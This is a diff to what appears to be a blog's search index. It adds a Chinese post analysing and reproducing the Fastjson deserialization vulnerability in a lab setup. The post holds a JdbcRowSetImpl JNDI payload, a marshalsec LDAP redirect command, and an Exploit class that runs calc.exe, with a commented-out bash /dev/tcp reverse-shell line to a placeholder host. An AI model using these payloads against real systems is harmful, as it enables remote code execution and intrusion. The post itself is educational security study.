@@ -65,6 +65,107 @@
       </tags>
   </entry>
   <entry>
+    <title>Fastjson反序列化漏洞原理分析及复现</title>
+    <url>/2025/04/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="Fastjson反序列化漏洞原理分析及复现"><a href="#Fastjson反序列化漏洞原理分析及复现" class="headerlink" title="Fastjson反序列化漏洞原理分析及复现"></a>Fastjson反序列化漏洞原理分析及复现</h1><p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0">TOC</a> </p>
+<h1 id="Fastjson序列化与反序列化"><a href="#Fastjson序列化与反序列化" class="headerlink" title="Fastjson序列化与反序列化"></a>Fastjson序列化与反序列化</h1><span id="more"></span>
+<h2 id="常规反序列化"><a href="#常规反序列化" class="headerlink" title="常规反序列化"></a>常规反序列化</h2><p>Fastjson的序列化与反序列化与常规的java反序列化不同，我们先来看一下正常的java反序列化，使用下面一段代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"><span class="keyword">import</span> java.io.*;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">	<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Unserilize.txt&quot;</span>);</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="comment">//新建一个对象</span></span><br><span class="line">	<span class="type">UnserializeTest</span> <span class="variable">unserializeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnserializeTest</span>();</span><br><span class="line">	unserializeTest.name = <span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line">	<span class="comment">//序列化 </span></span><br><span class="line">	<span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file); </span><br><span class="line">	<span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">	outputStream.writeObject(unserializeTest);</span><br><span class="line">	outputStream.close();</span><br><span class="line">	<span class="comment">//            fileOutputStream.close();</span></span><br><span class="line">	<span class="comment">//反序列化</span></span><br><span class="line">	<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">	<span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="type">UnserializeTest</span> <span class="variable">o</span> <span class="operator">=</span> (UnserializeTest) objectInputStream.readObject();</span><br><span class="line">	System.out.println(o.name);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">	&#125;    &#125;&#125;</span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">UnserializeTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">	in.defaultReadObject();</span><br><span class="line">	System.out.println(<span class="string">&quot;执行了readObject函数！！&quot;</span>);</span><br><span class="line">	Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反序列化的单词被我拼错了，尴尬，懒得改了</p>
+</blockquote>
+<p>我们知道在java中要实现序列化的类的的实例，其类必须实现Serializable或者Externalizable接口，Serializable接口是一个空接口，其只是作为一个标志，而Externalizable这是对Serializable接口的再一次封装，如下图：</p>
+<ul>
+<li><p>Serializable接口</p>
+<p>  <img src="https://img-blog.csdnimg.cn/6a6d1cb99b0b402b953565e4e2cf16ab.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+</li>
+<li><p>Externalizable接口  可以看到Externalizable继承了Serializable接口，并添加了自己的方法。 因为这个原因，我们在demo中首先编写了一个UnserializeTest类用于被序列化，该类中重写了readObject方法，个人感觉也不算是重写，因为没有@override注解，应该是应为作用域的缘故导致在调用的时候先只能执行了本类中的readObject方法，在该类中我们执行了操作系统命令弹出一个计算机，并打印了一段话。 demo代码运行的结果就是，会在控制台打印：</p>
+<p>  <img src="https://img-blog.csdnimg.cn/091b0c67494b41ffb9d9683fdc906ab9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行了readObject函数！！armandhe</span><br></pre></td></tr></table></figure>
+
+<p>并生成一个Userilize.txt文件和弹出计算机，如下图：</p>
+<p><img src="https://img-blog.csdnimg.cn/2054e547d1474af8a4afe1c89536a358.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>我们通过常规的方式打开Unserilize.txt会看到一堆乱码：</p>
+<p><img src="https://img-blog.csdnimg.cn/564c62fffaa6489e9b9011c964900371.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>所以我们使用linux的xxd命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxd Unserilize.txt</span><br></pre></td></tr></table></figure>
+
+<p>或者在windows中使用010editor打开它：</p>
+<p><img src="https://img-blog.csdnimg.cn/b34603f2965d4e11b7a734ba5477c52f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>需要注意的特征是，开头的ACED0005，这个是java序列化数据的特征，有助于我们快速定位程序的反序列化利用点。其实后面的73 72也有特定的含义，不过具体的我忘记了，感兴趣的朋友可以自行查询。我们可以利用工具对该数据进行解析：</p>
+<p><img src="https://img-blog.csdnimg.cn/849debb381a6405992e49667e605122c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>这样我们就可以看到对象序列化之前对应的类，以及其中其中的可被序列化的methods与fields。 常规java序列化调用的是writeObject方法，反序列化则调用的是readObject方法，如果目标类在实现的时候重写了readObject方法想我们的demo代码一样，并包含有一些危险的操作的参数是用户可控的话，那么就可能导致反序列化漏洞。 ## Fastjson序列化与反序列化 Fastjson可以将JSONObject或者javaBean序列化为JSON字符串。关于javaBean的只是可以参考廖雪峰的网站：</p>
+<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">javaBean是什么</a></p>
+<p>Fastjson在对javaBean进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的set方法，我们可以看下面的代码，如果这个set方法中含有一些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令： 首先我们准备一个javaBean，FastjsonUnserilizeTest.java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.armandhe.javabase;public class FastjsonUnserilizeTest &#123;    private String name;    private int age;    public String getName() &#123;        System.out.println(&quot;调用了getname方法！&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;调用了setname方法！&quot;);        this.name = name;    &#125;    public int getAge() &#123;        System.out.println(&quot;调用了getage方法！&quot;);        return age;    &#125;    public void setAge(int age) &#123;        System.out.println(&quot;调用了setage方法！&quot;);        this.age = age;    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后是序列化与反序列化代码,FastjsonUnserilizeMain.java：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.armandhe.javabase;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.serializer.SerializerFeature;public class FastjsonUnserilizeMain &#123;    public static void main(String[] args) &#123;        //新建对象        System.out.println(&quot;新建对象：&quot;);        FastjsonUnserilizeTest fastjsonUnserilizeTest = new FastjsonUnserilizeTest();        fastjsonUnserilizeTest.setName(&quot;armband&quot;);        fastjsonUnserilizeTest.setAge(24);        //序列化        System.out.println(&quot;\n序列化：&quot;);        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);        System.out.println(s);        String jsonString = &quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;;        //反序列化        System.out.println(&quot;\n反序列化：&quot;);        FastjsonUnserilizeTest fastjsonUnserilizeTest1 = JSON.parseObject(s, FastjsonUnserilizeTest.class);        System.out.println(fastjsonUnserilizeTest1);        String name = fastjsonUnserilizeTest1.getName();        System.out.println(name);    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行后控制控制台打印：</p>
+<p><img src="https://img-blog.csdnimg.cn/e765687c1e1446b7ac03b0de91b05763.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>第一部分是在我们新建对象的时候调用了两次set方法 第二部分是在序列化的时候调用了get方法 第三部分是在反序列化的时候调用了set方法 注意到Fastjson中序列化调用的是JSON.toJSONString方法，反序列化调用的是JSON.parseObject方法。</p>
+<h1 id="Fastjson发序列化漏洞原理"><a href="#Fastjson发序列化漏洞原理" class="headerlink" title="Fastjson发序列化漏洞原理"></a>Fastjson发序列化漏洞原理</h1><p>我们注意到在进行序列化操作的时候JSON.toJSONString方法有一个参数SerializerFeature.WriteClassName，这个参数就是在序列化是包含类名，也就是这个参数导致了Fastjson的反序列化漏洞，这个参数实现的功能在Fastjson中被称作AutoType，即自动类型。如果不添加这个参数我们的javaBean序列化后应该是这样的：</p>
+<p><img src="https://img-blog.csdnimg.cn/eb8629b5c130479db16ea78a72bae30f.png"></p>
+<p>对比一下包含有上述参数：</p>
+<p><img src="https://img-blog.csdnimg.cn/985e97bcda824b99b2e998f204ce68cd.png"></p>
+<p>可以看到多了一个@type参数。 如果没有SerializerFeature.WriteClassName参数，我们在进行反序列化时，代码这样写：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String s= &quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
+
+<p>这时候我们是不能控制到底要反序列化为什么类型的对象的，只能开发者在代码中指定好，如这样：</p>
+<p><img src="https://img-blog.csdnimg.cn/a7c0251edcff4126bf83411d163187aa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>而如果我们在序列化的时候添加了该参数，我们则可以在反序列化的时候通过控制@type键的值来控制该序列化数据要被反序列化为什么样的对象，即调用什么类的set 方法，接下来要用到的就是找到这样一个类可以被用来完成我们想要的功能。 其中一个类是：com.sun.rowset.JdbcRowSetImpl 我们查看以下这个类，定位到setDataSource方法：</p>
+<p><img src="https://img-blog.csdnimg.cn/1fa94087c6e04f1a84cebb3a6f394142.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>这段代码首先判断了this.getDataSourceName（）是否为空，我们定位到getDataSourceName（）方法处查看一下他的返回值：</p>
+<p><img src="https://img-blog.csdnimg.cn/89e36fc1c0614c2290f857cf77a43e64.png"></p>
+<p>返回dataSource，是一个字符串类型，那么我们在反序列化调用set方法时dataSource首先是没有值的，也就是说this.getDataSourceName（）的返回值为null，这逻辑进入到else部分，调用了父类的setDataSourceName，并将var1传了进去。其实这一串都不重要，只需要知道反序列化的时候会自动调用setDataSourceName为DataSourceName赋值就可以了。 再在com.sun.rowset.JdbcRowSetImpl类中定位到setAutocommit方法：</p>
+<p><img src="https://img-blog.csdnimg.cn/fbca0f32cedc450680f5b55e9d11101a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>在定位到this.connect方法：</p>
+<p><img src="https://img-blog.csdnimg.cn/d67bb450ac91440f8a388a8f533b5b9c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>在这里我们注意到有个lookup方法，该方法就是JNDI中访问远程服务器获取远程对象的方法，其参数为服务器地址。如果其参数可控那么就可能被攻击，而this.getDataSourceName是获取DataSourceName的值得方法，那么我们只要控制了this.setDataSourceName方法的参数就可以访问我们自己的服务器了。而我们知道Fastjson在反序列化的时候会调用所有的set方法，正好可以通过setDataSourceName对DataSourceName进行赋值。于是，我们就有了这样的Fastjson序列化数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/POC&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这儿autoCommit好像必须设置为true，为啥我忘记了，昨天看的，待会儿去找找！！ 漏洞的原理就是这样，接下来就是复现了，好紧张。。。。</p>
+<h1 id="一次失败的复现"><a href="#一次失败的复现" class="headerlink" title="一次失败的复现"></a>一次失败的复现</h1><p>我们利用现有的靶场环境：</p>
+<p><img src="https://img-blog.csdnimg.cn/89fa5bbcf94d4379afe17f7c27fdb35e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>将含有漏洞的war包直接放到tomcat的webapps目录下，然后启动tomcat就可以了，访问下：</p>
+<p><img src="https://img-blog.csdnimg.cn/8d3cb37607bd4836ad8c5149ddc1dd7b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>出啊先helloword则代表靶场搭建完毕，然后我们去看看这个war包怎么写的：</p>
+<p><img src="https://img-blog.csdnimg.cn/56db757d2dc34a6b828c14e2bff4ae8c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>这里有两个文件，主要的逻辑在过滤器那个类中，我直接给他粘出来：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.parser.Feature;import spark.Spark;import spark.servlet.SparkApplication;public class IndexFilter implements SparkApplication &#123;    public IndexFilter() &#123;    &#125;    public void init() &#123;        Spark.get(&quot;/&quot;, (req, res) -&gt; &#123;            return &quot;Hello World&quot;;        &#125;);        Spark.post(&quot;/&quot;, (request, response) -&gt; &#123;            String data = request.body();            JSONObject obj = JSON.parseObject(data, new Feature[]&#123;Feature.SupportNonPublicField&#125;);            JSONObject ret = new JSONObject();            ret.put(&quot;success&quot;, 200);            ret.put(&quot;data&quot;, &quot;Hello &quot; + obj.get(&quot;name&quot;) + &quot;, Your age is &quot; + obj.get(&quot;age&quot;));            response.status(200);            response.type(&quot;application/json&quot;);            return ret.toJSONString();        &#125;);    &#125;    public static void main(String[] args) &#123;        IndexFilter i = new IndexFilter();        i.init();    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，如果请求的方法为get则返回hello word ，如果为post则对传上来的数据进行反序列化操作，并输出 你的年纪与姓名这里面有一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Feature[]&#123;Feature.SupportNonPublicField&#125;);             JSONObject ret = new JSONObject();             ret.put(&quot;success&quot;, 200);</span><br></pre></td></tr></table></figure>
+
+<p>参数是为了让被private修饰的值也能被反序列化。 我们传入正常的数据： get请求：</p>
+<p><img src="https://img-blog.csdnimg.cn/a8524ed43bfb4d23999d84ca99143b64.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>post请求：</p>
+<p><img src="https://img-blog.csdnimg.cn/e0cd952100a249e2893f03439cd8508c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>然后传入我们构造的payload:</p>
+<p><img src="https://img-blog.csdnimg.cn/e229e0f363784fc2b3bf5b105e551930.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>在操作前记得先搭建好ldap服务器，使用的工具是marshalsec，可以在gihub上找到，命令是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1/#Exploit&quot; 6666</span><br></pre></td></tr></table></figure>
+
+<p>当靶机访问该服务器的时候，会被重定向到本机的80端口上访问Exploit.class文件，Exploit.java文件中的内容为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;<span class="keyword">import</span> java.io.InputStream;<span class="keyword">import</span> java.io.InputStreamReader;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;);      <span class="comment">//Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);        InputStream is = p.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(is));        String line;        while((line = reader.readLine()) != null) &#123;            System.out.println(line);        &#125;        p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;    public static void main(String[] args) throws Exception &#123;    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行了打开计算机的命令，但我的操作并没有打开计算机，据说是应为jdk版本的原因。详情见： <a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a> 参考文章： <a href="https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">fastjson反序列化漏洞复现</a> <a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a></p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+        <tag>网络安全</tag>
+        <tag>FashJSON</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Apache RocketMQ 远程代码执行（CVE-2023-37582）</title>
     <url>/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-37582/</url>
     <content><![CDATA[<h1 id="CVE-2023-37582"><a href="#CVE-2023-37582" class="headerlink" title="CVE-2023-37582"></a>CVE-2023-37582</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>RocketMQ是阿里巴巴在2012年开发的分布式消息中间件，后捐献给Apache软件基金会并成为Apache的顶级项目。RocketMQ专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。</p>
@@ -188,193 +289,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Fastjson反序列化漏洞原理分析及复现</title>
-    <url>/2025/04/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="Fastjson反序列化漏洞原理分析及复现"><a href="#Fastjson反序列化漏洞原理分析及复现" class="headerlink" title="Fastjson反序列化漏洞原理分析及复现"></a>Fastjson反序列化漏洞原理分析及复现</h1><p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0">TOC</a> </p>
-<h1 id="Fastjson序列化与反序列化"><a href="#Fastjson序列化与反序列化" class="headerlink" title="Fastjson序列化与反序列化"></a>Fastjson序列化与反序列化</h1><span id="more"></span>
-<h2 id="常规反序列化"><a href="#常规反序列化" class="headerlink" title="常规反序列化"></a>常规反序列化</h2><p>Fastjson的序列化与反序列化与常规的java反序列化不同，我们先来看一下正常的java反序列化，使用下面一段代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"><span class="keyword">import</span> java.io.*;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">	<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Unserilize.txt&quot;</span>);</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="comment">//新建一个对象</span></span><br><span class="line">	<span class="type">UnserializeTest</span> <span class="variable">unserializeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnserializeTest</span>();</span><br><span class="line">	unserializeTest.name = <span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line">	<span class="comment">//序列化 </span></span><br><span class="line">	<span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file); </span><br><span class="line">	<span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">	outputStream.writeObject(unserializeTest);</span><br><span class="line">	outputStream.close();</span><br><span class="line">	<span class="comment">//            fileOutputStream.close();</span></span><br><span class="line">	<span class="comment">//反序列化</span></span><br><span class="line">	<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">	<span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="type">UnserializeTest</span> <span class="variable">o</span> <span class="operator">=</span> (UnserializeTest) objectInputStream.readObject();</span><br><span class="line">	System.out.println(o.name);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">	&#125;    &#125;&#125;</span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">UnserializeTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">	in.defaultReadObject();</span><br><span class="line">	System.out.println(<span class="string">&quot;执行了readObject函数！！&quot;</span>);</span><br><span class="line">	Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>反序列化的单词被我拼错了，尴尬，懒得改了</p>
-</blockquote>
-<p>我们知道在java中要实现序列化的类的的实例，其类必须实现Serializable或者Externalizable接口，Serializable接口是一个空接口，其只是作为一个标志，而Externalizable这是对Serializable接口的再一次封装，如下图：</p>
-<ul>
-<li><p>Serializable接口</p>
-<p>  <img src="https://img-blog.csdnimg.cn/6a6d1cb99b0b402b953565e4e2cf16ab.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-</li>
-<li><p>Externalizable接口  可以看到Externalizable继承了Serializable接口，并添加了自己的方法。 因为这个原因，我们在demo中首先编写了一个UnserializeTest类用于被序列化，该类中重写了readObject方法，个人感觉也不算是重写，因为没有@override注解，应该是应为作用域的缘故导致在调用的时候先只能执行了本类中的readObject方法，在该类中我们执行了操作系统命令弹出一个计算机，并打印了一段话。 demo代码运行的结果就是，会在控制台打印：</p>
-<p>  <img src="https://img-blog.csdnimg.cn/091b0c67494b41ffb9d9683fdc906ab9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行了readObject函数！！armandhe</span><br></pre></td></tr></table></figure>
-
-<p>并生成一个Userilize.txt文件和弹出计算机，如下图：</p>
-<p><img src="https://img-blog.csdnimg.cn/2054e547d1474af8a4afe1c89536a358.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>我们通过常规的方式打开Unserilize.txt会看到一堆乱码：</p>
-<p><img src="https://img-blog.csdnimg.cn/564c62fffaa6489e9b9011c964900371.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>所以我们使用linux的xxd命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxd Unserilize.txt</span><br></pre></td></tr></table></figure>
-
-<p>或者在windows中使用010editor打开它：</p>
-<p><img src="https://img-blog.csdnimg.cn/b34603f2965d4e11b7a734ba5477c52f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASXdhbnR1cm9vdA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>需要注意的特征是，开头的ACED0005，这个是java序列化数据的特征，有助于我们快速定位程序的反序列化利用点。其实后面的73 72也有特定的含义，不过具体的我忘记了，感兴趣的朋友可以自行查询。我们可以利用工具对该数据进行解析：</p>
